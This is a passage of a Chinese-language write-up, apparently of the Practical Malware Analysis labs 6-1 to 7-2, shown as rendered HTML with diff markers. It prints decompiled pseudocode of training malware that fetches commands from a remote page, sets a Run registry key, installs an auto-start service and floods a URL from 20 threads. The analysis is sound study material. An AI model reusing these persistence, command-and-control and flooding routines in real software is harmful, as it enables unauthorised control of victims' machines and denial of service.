+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">B7</span>                 <span style="color:#66d9ef">cmp</span>     [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">VersionInformation.dwPlatformId</span>], <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">BE</span>                 <span style="color:#66d9ef">setz</span>    <span style="color:#66d9ef">al</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">C1</span>                 <span style="color:#66d9ef">leave</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">C2</span>                 <span style="color:#66d9ef">retn</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">C2</span> <span style="color:#66d9ef">sub_10003695</span>    <span style="color:#66d9ef">endp</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>可能会检查程序是否在Windows NT 4.0或更早的时候运行这些版本有不同的平台ID,而不是后期版本的Windows。这个对于那些不设计以更新版本的旧程序来说是有用的窗户。</p>
+</li>
+</ol>
+<h3>Lab 6-1<span class="hx-absolute -hx-mt-20" id="lab-6-1"></span>
+    <a href="#lab-6-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>main函数的主要逻辑如下：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_401000</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  BOOL ConnectedState; <span style="color:#75715e">// [esp+0h] [ebp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  ConnectedState <span style="color:#f92672">=</span> <span style="color:#a6e22e">InternetGetConnectedState</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( ConnectedState )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_40105F</span>(aSuccessInterne, ConnectedState);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_40105F</span>(aError11NoInter, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>在0x40105f中，函数逻辑像从某某读取内容的操作。</p>
+<p>整个函数逻辑大概为先检查网络是否连接，如果连接，则读取字符串<code>Success: Internet Connection</code>并打印；如果无法连接，则读取字符串<code>Error 1.1: No Internet</code>并打印</p>
+<h3>Lab 6-2<span class="hx-absolute -hx-mt-20" id="lab-6-2"></span>
+    <a href="#lab-6-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>main函数的主要逻辑如下：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v4; <span style="color:#75715e">// [esp+0h] [ebp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">sub_401000</span>() )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_401040</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_40117F</span>(<span style="color:#e6db74">&#34;Success: Parsed command is %c</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v4);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">0xEA60u</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>进行两个if的判断操作。</p>
+<p>在0x40117f中，函数逻辑像打印传入的参数。在这个子函数中使用了switch判断操作。</p>
+<p>在0x401040中，函数的逻辑像使用if来检查html的连通性，成功则下载<code>http://www.practicalmalwareanalysis.com/cc.htm</code>，失败则报错</p>
+<p>网络特征为首先是打开<code>Internet Explorer 7.5/pma</code>，之后是下载<code>http://www.practicalmalwareanalysis.com/cc.htm</code></p>
+<p>首先检查网络连通性，如果连通则下载<code>http://www.practicalmalwareanalysis.com/cc.htm</code>，让后输出到屏幕:<code>Success: Parsed command is （这个文件）</code>并休眠1分钟；如果不连通则退出。</p>
+<h3>Lab 6-3<span class="hx-absolute -hx-mt-20" id="lab-6-3"></span>
+    <a href="#lab-6-3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>相比6-2多调用了一个<code>sub_401130(v4, *argv);</code>函数。</p>
+<p>其中一个参数(v4)是有关下载的htlm中的值，另一个参数(*argv)是终端中执行文件后跟的参数。这个函数里面使用switch进行判断。判断用户输入的参数来执行相应的操作：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>a:<span style="color:#960050;background-color:#1e0010">创建一个新的目录</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateDirectoryA与PathName指定的路径</span><span style="color:#960050;background-color:#1e0010">。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b:<span style="color:#960050;background-color:#1e0010">复制文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">使用</span><span style="color:#a6e22e">CopyFileA使用lpexiingfilename指定的源文件名</span>,<span style="color:#960050;background-color:#1e0010">和数据指定的目标文件名。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#960050;background-color:#1e0010">删除使用文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DeleteFileA与数据指定的文件路径</span><span style="color:#960050;background-color:#1e0010">。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d:<span style="color:#960050;background-color:#1e0010">打开注册表</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">键使用</span><span style="color:#a6e22e">RegOpenKeyExA使用子键指定的关键名称</span>,<span style="color:#960050;background-color:#1e0010">并设置</span><span style="color:#66d9ef">ValueName的值到数据的内容</span><span style="color:#960050;background-color:#1e0010">。如果这个操作失败了，则调用</span><span style="color:#66d9ef">sub_401271错误消息</span><span style="color:#960050;background-color:#1e0010">。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e:<span style="color:#960050;background-color:#1e0010">睡眠时间为100秒</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">使用睡眠。</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>本地的特特征是在注册表中添加键<code>Software\Microsoft\Windows\CurrentVersion\Run\Malware</code>也就是添加到开机自启动。</p>
+<p>该程序先检查是否存在有效的Internet连接。如果找不到，程序直接终止。否则，改程序会尝试下载一个网页，该网页包含一段以&lt;!&ndash;开头的HTML注释。该注释的第一个字符被用于switch语句来决定程序在本地系统运行的下一步行为，包括是否删除一个文件、创建一个目录、设置一个注册表run键、复制一个文件或者休眠100秒。</p>
+<h3>Lab 6-4<span class="hx-absolute -hx-mt-20" id="lab-6-4"></span>
+    <a href="#lab-6-4" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>与6-3相比添加了一个循环的次数，循环1441次6-3的逻辑。一次循环休眠1分钟，则执行完需要24小时，并且User-Agent中添加了运行时间的分钟数。</p>
+<h3>Lab 7-1<span class="hx-absolute -hx-mt-20" id="lab-7-1"></span>
+    <a href="#lab-7-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>程序首先定义了一个名为<code>MalService</code>的服务：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ServiceStartTable.lpServiceName <span style="color:#f92672">=</span> aMalservice;</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>之后程序尝试获取一个名为<code>HGL345</code>的互斥体，如果存在则退出：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">OpenMutexA</span>(<span style="color:#ae81ff">0x1F0001u</span>, <span style="color:#ae81ff">0</span>, Name) )
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ExitProcess</span>(<span style="color:#ae81ff">0</span>);</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>如果不存在，则创建一个互斥体：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">CreateMutexA</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, Name);</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>之后打开SCM（系统控制管理器）：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SCM <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenSCManagerA</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3u</span>);</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>获取当前进程的handle：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">GetCurrentProcess</span>()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>获取当前模块名，并且创建一个名为<code>Malservice</code>的服务，<code>CreateServiceA</code>这个函数的第四个参数为二则代表SERVICE_AUTO_START：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">GetModuleFileNameA</span>(<span style="color:#ae81ff">0</span>, Filename, <span style="color:#ae81ff">0x3E8u</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateServiceA</span>(SCM, DisplayName, DisplayName, <span style="color:#ae81ff">2u</span>, <span style="color:#ae81ff">0x10u</span>, <span style="color:#ae81ff">2u</span>, <span style="color:#ae81ff">0</span>, Filename, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>之后清空系统时间结构体中月的成员，并设置年为2100年，之后设置了一个Timer来等待这个时间：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>SystemTime.wMonth, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">14</span>);
+</span></span><span style="display:flex;"><span>SystemTime.wYear <span style="color:#f92672">=</span> <span style="color:#ae81ff">2100</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SystemTimeToFileTime</span>(<span style="color:#f92672">&amp;</span>SystemTime, <span style="color:#f92672">&amp;</span>FileTime);
+</span></span><span style="display:flex;"><span>WaitableTimerA <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateWaitableTimerA</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetWaitableTimer</span>(WaitableTimerA, <span style="color:#f92672">&amp;</span>FileTime, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>如果时间没到，则睡觉（时间很长,如果这个睡觉时间结束，但是等待的时间还没有到，程序似乎就直接退出了，因为这个0xFFFFFFFF才2.05天），如果时间到了则创建20个线程，这20个线程一直循环访问网站<code>http://www.malwareanalysisbook.com</code>：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">WaitForSingleObject</span>(WaitableTimerA, <span style="color:#ae81ff">0xFFFFFFFF</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CreateThread</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, StartAddress, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">--</span>v2;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v2 );
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">0xFFFFFFFF</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> __noreturn <span style="color:#a6e22e">StartAddress</span>(LPVOID lpThreadParameter)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>i; <span style="color:#75715e">// esi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#a6e22e">InternetOpenA</span>(szAgent, <span style="color:#ae81ff">1u</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>); ; <span style="color:#a6e22e">InternetOpenUrlA</span>(i, szUrl, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80000000</span>, <span style="color:#ae81ff">0</span>) )
+</span></span><span style="display:flex;"><span>    ;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Lab 7-2<span class="hx-absolute -hx-mt-20" id="lab-7-2"></span>
+    <a href="#lab-7-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>所有代码如下，显而易见没有持久化，不退出等操作：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  OLECHAR <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// esi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  LPVOID ppv; <span style="color:#75715e">// [esp+0h] [ebp-24h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  VARIANTARG pvarg; <span style="color:#75715e">// [esp+4h] [ebp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> v7[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [esp+14h] [ebp-10h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// [esp+1Ch] [ebp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">OleInitialize</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoCreateInstance</span>(<span style="color:#f92672">&amp;</span>rclsid, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4u</span>, <span style="color:#f92672">&amp;</span>riid, <span style="color:#f92672">&amp;</span>ppv);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ppv )
+</span></span><span style="display:flex;"><span>    {
